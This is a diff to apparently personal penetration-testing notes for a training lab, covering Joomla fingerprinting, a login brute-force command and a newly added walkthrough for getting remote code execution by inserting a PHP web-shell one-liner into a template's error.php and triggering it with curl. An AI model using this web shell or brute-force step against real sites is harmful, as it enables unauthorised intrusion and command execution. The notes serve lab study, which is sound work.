@@ -125,7 +125,7 @@ curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxee
 * Make sure to cleanup the `.php` file left behind
 
 # Joomla
-* another CMS like wordpress, just not as popular
+* another Content Management System like wordpress, just not as popular
 * can fingerprint by looking at the page source: `curl -s http://dev.inlanefreight.local/ | grep Joomla`
 * ex robots.txt file
 ```bash
@@ -168,4 +168,18 @@ Disallow: /tmp/
 * script to brute force the login:
 ```bash
 sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
+```
+### Attacking Joomla
+* Once logged in, can get rce from adding a php script to a template
+	* click on `templates` under `configuration`
+	* click on a template name, go to the `customise` page
+	* try using the `error.php` page
+	* One liner for ce:
+```php
+system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
+```
+* save and close
+* confirm with curl:
+```bash
+curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
 ```
